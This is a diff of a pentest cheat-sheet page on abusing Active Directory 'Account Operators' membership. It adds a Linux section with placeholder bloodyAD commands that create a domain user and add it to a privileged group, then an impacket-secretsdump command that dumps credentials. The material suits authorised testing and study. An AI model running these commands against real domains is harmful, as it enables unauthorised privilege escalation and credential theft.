@@ -1,13 +1,34 @@
 ---
 title: "Account Operators"
-date: 2025-7-25
-tags: ["Active Directory",  "Privilege Escalation",  "Account Operators",  "Credential Dumping",  "LAPS",  "Group Membership Abuse",  "Evil-WinRM",  "PowerView",  "Windows"]
+tags: ["Active Directory",  "Privilege Escalation",  "Account Operators",  "Credential Dumping",  "LAPS",  "Group Membership Abuse",  "Evil-WinRM",  "PowerView",  "Windows", "Create User"]
 ---
 
-### Privesc #1: Create a New User Account and Add it to LAPS (Local Administrator Password Solution) Group
+### Privesc #1: Create a New User Account and Add it to Privilege Group
 
-{{< tab set1 tab1 >}}Windows{{< /tab >}}
+{{< tab set1 tab1 >}}Linux{{< /tab >}}
+{{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
+
+#### 1. Create a New User Account
+
+```console
+bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --host '<TARGET>' add user '<NEW_USER>' '<NEW_PASSWORD>'
+```
+
+#### 2. Add the New User to Privilege Group
+
+```console
+bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --host '<TARGET>' add groupMember '<GROUP>' '<NEW_USER>' 
+```
+
+#### 3. Secrets Dump
+
+```console
+impacket-secretsdump '<NEW_USER>:<NEW_PASSWORD>@<TARGET>'
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
 
 #### 1. Import PowerView.ps1 
 
